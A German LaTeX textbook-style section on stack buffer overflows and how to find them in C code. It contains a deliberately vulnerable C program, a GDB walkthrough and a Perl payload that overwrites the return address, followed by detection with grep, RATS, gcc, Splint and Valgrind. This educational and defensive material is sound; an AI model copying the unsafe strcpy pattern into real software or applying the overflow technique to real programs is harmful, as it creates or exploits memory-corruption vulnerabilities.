\subsection{Buffer-Overflow Schwachstellen}	

Buffer-Overflows Schwachstellen entstehen im Regelfall durch die 
Verwendung von Programmiersprachen, die es einem Entwickler ermöglichen, 
allozierte Speicherbereiche unkontrolliert zu überschreiben.

\par\medskip 
Als ein typischer Vertreter für eine Programmiersprache die potentiell 
für Buffer-Schwachstellen anfällig ist, gilt die Programmiersprache C. 
Die Programmiersprache ermöglicht es einem Entwickler, nahezu beliebige 
Speicheradressen zu überschreiben und bietet darüber hinaus noch 
zahlreiche eigene, native C-Funktionen (z.B. \texttt{strcpy()}), die 
unabhängig vom Entwickler keinerlei Prüfungen in Hinsicht auf den 
benötigten Speicherplatz implementiert haben.
\\\\
\textbf{Beispiel: Stack-Overflow (Setup: x64-System, Linux, gcc-4.8.1)}
\\
Der C-Code im folgenden Beispiel erwartet die Eingabe einer beliebigen 
Zeichenkette mit einer maximalen Länge von 63 Zeichen zzgl. 
des String-Ende-Zeichens als Kommandozeilenparameter. 
Die im Code verwendete C-Funktion \texttt{strcpy()} gilt als unsicher, 
da keine Längenprüfung des zu kopierenden Strings vorgenommen wird. 
Mithilfe der \texttt{strcpy()}-Funktion ist es später möglich, die 
Rücksprungadresse der \texttt{go()}-Funktion so zu modifizieren, dass 
die im Code nicht aufgerufene Funktion \texttt{pwnd()} ausgeführt wird.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int go(char *input) {
        char data[64];
        strcpy(data,input);
        printf ("String: %s\n", data);
        return 1;
}

void pwnd(void) {
        printf("\nPWND!\n");
        exit(0);
}

int main(int argc, char *argv[]) {
        if (argc > 1)
        go(argv[1]);
}
\end{lstlisting}

\begin{figure}[htbp]
 \centering
 \includegraphics[scale=.5]{abbildungen/poc_1}
 \caption{Reguläre Funktionsweise des Programms}
 \label{fig:poc_1} 
\end{figure}

Im Folgenden wird das Programm analysiert und versucht, durch eine erfolgreiche Modifikation der Speicheradressen die Funktion \texttt{pwnd()} aufzurufen.
Um das Programm zu analysieren wird der GNU Debugger\footnote{http://www.gnu.org/software/gdb} (GDB-Kurzreferenz\footnote{http://beej.us/guide/bggdb}) verwendet. Für einen ersten Überblick werden die drei Funktionen disassembliert.
\\
\\
\texttt{main()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
[florian@audit exploit]$ gdb -q poc
Reading symbols from /home/florian/exploit/poc...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400624 <+0>:     push   %rbp
   [...]
   0x000000000040063d <+25>:    add    $0x8,%rax
   0x0000000000400641 <+29>:    mov    (%rax),%rax
   0x0000000000400644 <+32>:    mov    %rax,%rdi
   0x0000000000400647 <+35>:    callq  0x4005d0 <go>
   0x000000000040064c <+40>:    leaveq
   0x000000000040064d <+41>:    retq
End of assembler dump.
\end{lstlisting}
\texttt{go()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas go
Dump of assembler code for function go:
   [...]
   0x00000000004005e0 <+16>:    lea    -0x40(%rbp),%rax
   0x00000000004005e4 <+20>:    mov    %rdx,%rsi
   0x00000000004005e7 <+23>:    mov    %rax,%rdi
   0x00000000004005ea <+26>:    callq  0x400480 <strcpy@plt>
   0x00000000004005ef <+31>:    lea    -0x40(%rbp),%rax
   0x00000000004005f3 <+35>:    mov    %rax,%rsi
   0x00000000004005f6 <+38>:    mov    $0x4006d4,%edi
   0x00000000004005fb <+43>:    mov    $0x0,%eax
   0x0000000000400600 <+48>:    callq  0x4004a0 <printf@plt>
   0x0000000000400605 <+53>:    mov    $0x1,%eax
   0x000000000040060a <+58>:    leaveq
   0x000000000040060b <+59>:    retq
End of assembler dump.
\end{lstlisting}
\texttt{pwnd()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas pwnd
Dump of assembler code for function pwnd:
   0x000000000040060c <+0>:     push   %rbp
   [...]
\end{lstlisting}
\par\medskip 
Aus den disassemblierten Funktionen können folgende Informationen entnommen werden:
\\
\textbf{\texttt{main()}-Funktion}

\begin{itemize}
      \item \texttt{0x0000000000400647 <+35>:    callq  0x4005d0 <go>}\\
        An dieser Stelle wird durch einen \texttt{call} die Funktion \texttt{go()} aufgerufen.
      \item \texttt{0x000000000040064c <+40>:    leaveq}\\
        Wurde die \texttt{go()}-Funktion erfolgreich durchlaufen, wird aus der \texttt{go()}-Funktion an diese Speicheradresse in die \texttt{main()}-Funktion zurückgesprungen.       
\end{itemize}
\textbf{\texttt{go()}-Funktion}

\begin{itemize}
      \item \texttt{x00000000004005ef <+31>:    lea    -0x40	(\%rbp), \%rax}\\
        Aufgrund des vorhandenen C-Code ist bereits bekannt, dass für die \texttt{strcpy()}-Funktion ein \SI{64}{Byte} großes Charakter-Array (\texttt{char data[64]}) als Ziel des Kopiervorgangs reserviert wurde. Läge der C-Code nicht vor, könnte man durch den hexadezimalen Wert \texttt{0x40} die maximale Speichergröße von \SI{64}{Byte} feststellen.        
      \item \texttt{0x000000000040060b <+59>:    retq}\\
        Nach der Ausführung dieser Instruktion muss der Befehlszeiger (IP, bei x64 RIP abgekürzt) auf die Speicheradresse \texttt{0x40064c} innerhalb der \texttt{main()}-Funktion zeigen.
\end{itemize}



\textbf{\texttt{pwnd()}-Funktion}

\begin{itemize}
      \item \texttt{0x000000000040060c <+0>:     push   \%rbp}\\
        Um die \texttt{pwnd()}-Funktion aus der \texttt{pwnd()}-Funktion heraus aufrufen zu können, muss der Befehlszeiger (RIP) innerhalb der \texttt{go()}-Funktion auf die Speicheradresse \texttt{0x40060c} geändert werden. 
\end{itemize}

Im Folgenden wird das Programm mit dem GDB gestartet, davor wird noch ein Haltepunkte an der Speicheradresse \texttt{0x40060b} gesetzt (siehe letzte Zeile der disassemblierten \texttt{go()} -Funktion) um die Überlegungen verifizieren zu können.
        
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
gdb) break *0x40060b
Breakpoint 6 at 0x40060b: file poc.c, line 13.
(gdb) run AAAAAAAA

String: AAAAAAAA

Breakpoint 6, 0x000000000040060b in go (input=0x7fffffffecdb "AAAAAAAA") at poc.c:13
13      }
(gdb) p &data
$20 = (char (*)[64]) 0x7fffffffe950
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb)
\end{lstlisting}

Das Programm wird mit 8-mal "A" als Konsolenparameter gestartet. Ist der Haltepunkte erreicht, wird der \SI{64}{Byte} große Speicherbereich der Variablen \texttt{data} gesucht. Im Anschluss werden vom Beginn des Speicherbereichs der Variablen \texttt{data} 12-mal \SI{8}{Byte} große Speicherbereiche dargestellt. 

Die ersten \SI{8}{Byte} entsprechen der hexadezimalen Darstellung der Zeichenfolge \texttt{AAAAAAAA}, die als Übergabeparameter verwendet wurde. Die folgenden 7-mal \SI{8}{Byte} großen Speicherblöcke werden nicht verwendet und beinhalten ausschließlich zufällige Werte. Um die Rücksprungadresse erfolgreich zu modifizieren, sind die folgenden \SI{8}{Byte} bzw. \SI{16}{Byte} relevant:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
\end{lstlisting}

Der linke Teil entspricht dem Basepointer (RBP), der rechte Teil entspricht der Rücksprungadresse in die \texttt{main()}-Funktion. Wird diese Adresse mit der Speicheradresse der \texttt{pwnd()}-Funktion überschrieben, so springt das Programm zur Laufzeit in die \texttt{pwnd()}-Funktion und führt diese aus.
 
Mit den folgenden Befehlen wird die \texttt{go()}-Funktion disassembliert, um die Startwert der \texttt{go()}-Funktion festzustellen. Im Anschluss werden die 12-mal \SI{8}{Byte} großen Speicheradressen ausgegeben und zwei Byte der Rücksprungadresse \texttt{0x40064c} modifiziert. Danach wird das Programm weiter ausgeführt und wie springt in die \texttt{pwnd()}-Funktion.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas pwnd
Dump of assembler code for function pwnd:
   0x000000000040060c <+0>:     push   %rbp
   [...]	

End of assembler dump.
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb) set {char}0x7fffffffe998 = 0x0c
(gdb) set {char}0x7fffffffe999 = 0x06
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040060c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb) c
Continuing.
PWND!
[Inferior 1 (process 1190) exited normally]
(gdb)
\end{lstlisting}

Um den Aufwand einer manuellen Modifikation der Speicheradresse möglichst gering zu halten, kann man den Vorgang mit der \texttt{Perl} automatisieren:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) run `perl -e 'print "A"x72 . "\x0c\x06\x40"'`
String: AAAAAAAAAAAAAAAAAAAAAAAAA ... AAAAAA@
PWND!
[Inferior 1 (process 1624) exited normally]
(gdb)
\end{lstlisting}

Dabei werden insgesamt \SI{72}{Byte} mit dem Zeichen \texttt{A} überschrieben und \SI{3}{Byte} mit hexadezimalen Werten:

\begin{itemize}
      \item \SI{64}{Byte} Speicherplatz der \texttt{data}-Variablen    
      \item \SI{8}{Byte} Basepointer
      \item \SI{3}{Byte} Rücksprungadresse unter Berücksichtigung der Byteorder (Little-Endian)
\end{itemize}

\textbf{Hinweis:}

Wird zur Nachstellung des Beispiels ein veralteter \texttt{gcc}-Compiler in der Version 3.x\footnote{http://www.trapkit.de/papers/gcc\_stack\_layout\_v1\_20030830.pdf} verwendet, ist es möglich, dass dieses Beispiel nicht funktioniert!

\subsection{Maßnahmen zur Behebung von Overflow-Schwachstellen}

In den folgenden Abschnitten werden Möglichkeiten beschrieben, wie man typische Overflow-Schwachstellen innerhalb eines Quelltextes aufspüren und beheben kann. Die folgend gezeigten Beispiele beziehen sich auf das im vorhergehenden Abschnitt beschriebe Quellcodebeispiel.

\subsubsection{Lexikalische Quellcode-Überprüfung}

Für eine lexikalische Überprüfung des Quellcodes können eine Vielzahl von Tools eingesetzt werden. Die Methoden reichen dabei von einer rudimentären grep-Analyse, über komplexe und meist kommerzielle statische Quellcodescanner-Lösungen (z.B. Fortify oder Checkmarx) bis hin zu Lösungen, die den Quellcode einer Anwendung sowohl statisch analysieren und zur Ausführung bringen um Laufzeitfehler erkennen zu können (z.B. Seeker)
Eine Liste von potentiell unsicheren C-Funktionen und deren „sicheren“ Derivate sind in den folgenden beiden, vom ISO-Komitee herausgegeben, Dokumenten zu finden:

\begin{itemize}
      \item TR 24731-1\footnote{http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1225.pdf}    
      \item TR 24731-2\footnote{http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1337.pdf}
\end{itemize}
	
Die beiden Dokumente werden in Foren und Fachkreisen kontrovers diskutiert, dennoch ist das Dokument TR 24731-1 in die Entwicklung der Microsofts Standard-C Bibliothek eingeflossen. Weiterhin wurden Empfehlungen aus den Dokumenten, wie z.B. die Entfernung der im C99-Standard noch enthaltenen \texttt{gets()}-Funktion, im neuen C-Standard (C11) umgesetzt.
Im Folgenden sollen nur zwei Beispiele für eine lexikalische Suche nach unsicheren Funktionen am Quellcode aus dem vorhergehenden Abschnitt vorgenommen werden:
\par\medskip 
Durch \texttt{grep()} werden sämtliche Zeilen des Quellcodebeispiels ausgegeben, in denen die Funktionen \texttt{strcpy()} und \texttt{gets()} aufgerufen werden. Bei diesem Vorgehen obliegt es dem Entwickler, diese Stellen im Quellcode eingehend auf Schwachstellen zu untersuchen und die unsicheren Funktionen durch die empfohlen Funktionsderivate zu ersetzen.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
[florian@audit exploit]$ grep -nE 'strcpy|gets' *.c
poc.c:9:        strcpy(data,input);
\end{lstlisting}

Es ist abzusehen, dass bei umfangreichen Quelltextanalysen eine solch rudimentäre Analyse zu einer sehr hohen "False-Postives“"-Rate führt. Aufgrund dieser Tatsache wurden lexikalische Quellcodescanner mit Ziel entwickelt, die Effizienz der Methode zu verbessern.

Effiziente Quellcodescanner reduzieren die Rate der gefundenen "False-Postives" beispielsweise durch die Verwendung interner Datenbanken, die  potentiell unsichere Quellcodefragmente mit in der Datenbank hinterlegen Codefragmenten abgleichen. Dabei wird weiterhin versucht, den Entwickler durch entsprechende Kommentare zu einer möglicherweise gefundenen Schwachstelle zu unterstützen. Ein Quellcodescanner sollte weder "False-Postives" noch "False-Negatives" produzieren. Dabei sollten "False Negatives" nach Möglichkeit nie vorkommen, da diese im Gegensatz zu "False Positives" zu Sicherheitsproblemen führen können.

Im Folgenden soll der frei verfügbare Quellcodescanner RATS\footnote{https://www.fortify.com/downloads2/public/rats-2.3-2.tar.gz} (Rough Auditing Tool for Security) vorgestellt werden. RATS ist in der Lage, C-, C++-, PHP-, Perl- und Python-Quelltext nach sicherheitsrelevanten Fehlern zu untersuchen. Schwerpunktmäßig berücksichtigt RATS dabei Buffer-Overflow- und Race-Condition-Schwachstellen.

[1] bietet eine detaillierte Einführung in die grundlegenden Prinzipien der sicheren Softwareentwicklung sowie in die Verwendung von RATS.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
[florian@audit exploit]$ rats -i --resultsonly  *.c
poc.c:8: High: fixed size local buffer
Extra care should be taken to ensure that character arrays that are allocated
on the stack are used safely.  They are prime targets for buffer overflow
attacks.

poc.c:9: High: strcpy
Check to be sure that argument 2 passed to this function call will not copy
more data than can be handled, resulting in a buffer overflow.
\end{lstlisting}

Bei der Ausgabe von RATS wird ein Nutzer gleich zu Beginn auf die Verwendung von Variablen mit fixer Puffergröße aufmerksam gemacht. Darüber hinaus wird darauf hingewiesen, dass man diese Puffer in Bezug auf potentielle Buffer-Overflow-Schwachstellen überprüfen sollte.

Im weiteren Verlauf der Ausgabe wird auf die Verwendung der unsicheren  \texttt{strcpy()}-Funktion und auf deren sichere Implementierung unter Berücksichtigung der benötigten Speichergröße des Zielpuffers hingewiesen.

\subsubsection{Semantische Quellcode-Überprüfungen}

Es existiert neben der rein lexikalischen Quelltextanalyse ein weiteres Analyseverfahren zur statischen Codeanalyse. Eine semantische Quellcode Analyse erlaubt es, die lexikalischen Bedeutungen innerhalb des Quelltextes in Bezug auf ihren Bedeutungszusammenhang auszuwerten. Dabei bedient sich diese Analysemethode einer Datenflussanalyse und ist somit in der Lage, detaillierte Rückschlüsse über laufende Vorgänge innerhalb eines Programms zuzulassen.

\minisec{Grundlegende Überprüfungen mit dem Compiler}

Bereits ein Compiler verfügt bereits meist über grundlegende Techniken um mindestens eine lexikalische und zusätzliche eine semantische Analyse des Quellcodes durchzuführen. Der GNU C Compiler verfügt über verschiedene Optionen, die eine Fehlervermeidung oder eine Fehlersuche unterstützen.

Wird bei Aufruf des GNU C Compilers die Option \texttt{–Wall} angegeben, veranlasst dies den Compiler dazu, eine Überprüfung des Quelltextes während des Kompilierens durchzuführen. Um die Meldungen des Compiler offensichtliche zu gestalten, wir die \texttt{main()}-Funktion durch eine folgende Codezeilen ergänzt:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
int main(int argc, char *argv[]) {
    [...]
    char array[8];
    printf("String eingeben: ");
    gets(array);
    printf ("Input-String: %s", array);
}
\end{lstlisting}

Wird der Quellcode jetzt mit der –Wall Funktion kompiliert erhält man folgende Compiler-Warnungen:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
[florian@audit exploit]$ gcc -Wall poc.c -o poc
poc.c: In function main:
poc.c:29:2: warning: gets is deprecated (declared at /usr/include/stdio.h:638) [-Wdeprecated-declarations]
  gets(array);
poc.c:31:1: warning: control reaches end of non-void function [-Wreturn-type]
}
\end{lstlisting}

Der GNU C Compiler macht den Entwickler darauf aufmerksam, dass er zum einen die unsichere und veraltete \texttt{gets()}-Funktion verwendet und darauf, dass die \texttt{main()}-Funktion über keinen Return-Wert am Ende verfügt.

Anhand dieses Beispiels ist ersichtlich, dass der Compiler zwar in der Lage ist, Sicherheitsüberprüfungen auf lexikalischer und semantischer Ebene durchzuführen jedoch bei Weitem offensichtlich nicht dazu in der Lage ist, unsichere Funktionsaufrufe wie z.B. den Aufruf der \texttt{strcpy()}-Funktion innerhalb der \texttt{go()}-Funktion zu erkennen.

\minisec{Erweiterte Überprüfung mit Splint}

Splint\footnote{http://www.splint.org/} ist ein statischer Quellcodescanner der in der Lage ist, eine weitaus detaillierte semantische Analyse als der GNU C Compiler vorzunehmen.

Splint ist in der Lage sogenannte LINT\footnote{http://en.wikipedia.org/wiki/Lint\_(software)}-Überprüfungen durchzuführen. Zu diesen Überprüfungen gehört beispielsweise die Suche nach Endlosschleifen, falschen Deklarationen oder ignorierten Rückgabewerten.

Im folgenden Beispiel wird der Beispielquelltext durch die Angabe des Parameters \texttt{+bounds-write} auf potentiellen Schwachstellen hin untersucht, die aufgrund eines schreibenden Speicherzugriffs zu einem Buffer-Overflow führen können.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
[florian@audit exploit]$ splint +bounds-write poc.c
Splint 3.1.2 --- 14 Sep 2011

poc.c: (in function go)
poc.c:9:2: Possible out-of-bounds store: strcpy(data, input)
    Unable to resolve constraint:
    requires maxRead(input @ poc.c:9:14) <= 63
     needed to satisfy precondition:
    requires maxSet(data @ poc.c:9:9) >= maxRead(input @ poc.c:9:14)
     derived from strcpy precondition: requires maxSet(<parameter 1>) >=
    maxRead(<parameter 2>)
  A memory write may write to an address beyond the allocated buffer. (Use
  -boundswrite to inhibit warning)
poc.c: (in function main)
poc.c:25:2: Return value (type int) ignored: go(argv[1])
  Result returned by function call is not used. If this is intended, can cast
  result to (void) to eliminate message. (Use -retvalint to inhibit warning)
  [...]
\end{lstlisting}

Der Scanner erkennt im Gegensatz zum GNU C Compiler, dass es durch den Aufruf der \texttt{strcpy()}-Funktion zu einem möglichen Speicherüberlauf kommen könnte. Durch die Verwendung von Annotationen innerhalb des zu prüfenden Quellcodes können vom Entwickler neben programmatischen Fehlern auch logische Fehler entdeckt werden. Beispielsweise können durch  Annotationen zwingend zu erfüllende Bedingungen festgelegt werden, die durch Splint geprüft werden, bevor eine bestimmte Funktion aufgerufen werden kann.

\subsubsection{Programmanalyse zur Programmlaufzeit}

Neben den beschreiben Möglichkeiten zur statischen Quellcodeanalyse besteht darüber hinaus die Möglichkeit, ein Programm zur Laufzeit auf Schwachstellen zu überwachen bzw. zu untersuchen, um gezielt Overflow-Schwachstellen die erst zur Programmlaufzeit entstehen ausfindig zu machen.

Ein mögliches Beispiel für eine potentielle Overflow-Schwachstelle die erst während der Laufzeit eines Programmes auftreten kann, ist der Aufruf der C-Funktion \texttt{malloc()} die erst zur Laufzeit eines Programms Speicher im Heap alloziert.

Ein typisches Tool zur Programmanalyse zur Laufzeit ist ein Debugger. Mit einem Debugger kann man Programme zeilenweise abarbeiten und dabei den aktuellen Zustand bzw. den Wert von Variablen analysieren. Die Qualität der Überprüfung des Programmcodes unter Zuhilfenahme eines Debuggers hängt stark von der Fachexpertise eines Entwicklers ab. Für umfangreiche Analyse von Programmen eignet sich ein Debugger nur bedingt.

Aus diesem Grund existieren spezielle Tools, die zur dynamischen Analyse von umfangreicheren Programmen oder Quelltexten eingesetzt werden können. Im Folgenden soll die Werkzeugsammlung Valgrind vorgestellt werden.

\minisec{Programmanalyse zur Laufzeit mit Valgrind}

Valgrind stellt eine Werkzeugsammlung zur dynamischen Fehleranalyse zur Programmlaufzeit dar. Dabei wird ein zu analysierendes Programm nicht auf der nativen Host-CPU, sondern innerhalb einer virtuellen Umgebung ausgeführt.
Vagrind übersetzt das Programm zu diesem Zweck in einen plattformunabhängigen Byte-Code, in den sogenannten Vex IR. Nach der Konvertierung des Programms in den Byte-Code können die verschiedenen Valgrind-Tools auf das zu analysierenden Programm angewendet werden.

Die Konvertierung des nativen Programms nach Vex IR reduziert die Ausführungsgeschwindigkeit eines Programmes um ein vielfaches, ermöglicht aber gleichzeitig eine detaillierte Analyse  benötigter (Speicher-)Ressourcen oder einzelner CPU-Register.

Für das folgende Beispiel wird die \texttt{go()}-Funktion um zwei \texttt{malloc()}-Funktionsaufrufe erweitert:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
int go(char *input) {
    char *data;	
    data  = (char *)malloc(sizeof(char)*8);
    data = (char *)malloc(sizeof(char)*64);

    strcpy(data,input);
    [...]
}
\end{lstlisting}

Anschließend wird das Programm kompiliert und mit Valgrind aufgerufen, als Startparameter wird 84-mal der Buchstabe A übergeben. Dabei kommt es, wie aus den vorhergehen Beispielen bereits bekannt, zu einem Buffer-Overflow:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
valgrind --tool=memcheck --leak-check=full ./poc `perl -e 'print "A"x84'`
\end{lstlisting}

Valgrind überprüft nun das Programm \texttt{poc} zur Laufzeit und generiert folgende Ausgabe:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
[...]
==10902== Invalid write of size 1
==10902==    at 0x4C2CBB2: __GI_strcpy (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==10902==    by 0x40069A: go (poc2.c:14)
==10902==    by 0x400703: main (poc2.c:31)
==10902==  Address 0x51e00e4 is 20 bytes after a block of size 64 alloc'd
==10902==    at 0x4C2C04B: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
[...]
==10902== HEAP SUMMARY:
==10902==     in use at exit: 8 bytes in 1 blocks
==10902==   total heap usage: 2 allocs, 1 frees, 72 bytes allocated
==10902==
==10902== 8 bytes in 1 blocks are definitely lost in loss record 1 of 1
==10902==    at 0x4C2C04B: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==10902==    by 0x400675: go (poc2.c:9)
==10902==    by 0x400703: main (poc2.c:31)
[...]
\end{lstlisting}

Wie der Ausgabe zu entnehmen ist, erkennt Valgrind zum einen, dass es beim Aufruf der \texttt{strcpy()}-Funktion zu einem Überlauf von \SI{20}{Byte} kommt und zum anderen, dass der \SI{8}{Byte} große (reservierte) Speicherblock aufgrund der fehlenden \texttt{free()}-Funktion nicht mehr freigeben wird und es zu einem unnötigen Verbrauch von Heap-Speicher kommt.
